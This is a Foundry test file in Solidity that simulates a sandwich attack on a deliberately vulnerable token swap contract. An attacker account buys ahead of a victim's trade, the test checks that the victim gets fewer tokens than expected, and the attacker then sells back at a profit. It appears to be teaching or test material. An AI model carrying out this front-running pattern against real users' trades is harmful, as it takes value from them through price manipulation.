// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/SimpleToken.sol";
import "../src/VulnerableSwap.sol";

contract SandwichAttackTest is Test {
    SimpleToken tokenA;
    SimpleToken tokenB;
    VulnerableSwap swap;

    address attacker = address(1);
    address victim = address(2);

    function setUp() public {
        tokenA = new SimpleToken("A", "A", 1_000_000 ether);
        tokenB = new SimpleToken("B", "B", 1_000_000 ether);
        swap = new VulnerableSwap(address(tokenA), address(tokenB));

        tokenA.approve(address(swap), type(uint256).max);
        tokenB.approve(address(swap), type(uint256).max);
        swap.addLiquidity(100_000 ether, 100_000 ether);

        tokenA.transfer(attacker, 50_000 ether);
        tokenA.transfer(victim, 10_000 ether);

        vm.prank(attacker);
        tokenA.approve(address(swap), type(uint256).max);

        vm.prank(victim);
        tokenA.approve(address(swap), type(uint256).max);
    }

    function testSandwichAttack() public {
        uint256 expected = swap.getAmountOut(10_000 ether, 100_000 ether, 100_000 ether);

        vm.prank(attacker);
        swap.swapAForB(30_000 ether);

        vm.prank(victim);
        swap.swapAForB(10_000 ether);

        uint256 victimOut = tokenB.balanceOf(victim);
        assertLt(victimOut, expected);

        uint256 attackerB = tokenB.balanceOf(attacker);

        vm.prank(attacker);
        tokenB.approve(address(swap), type(uint256).max);

        vm.prank(attacker);
        swap.swapBForA(attackerB);

        uint256 attackerFinalA = tokenA.balanceOf(attacker);
        assertGt(attackerFinalA, 50_000 ether);
    }
}
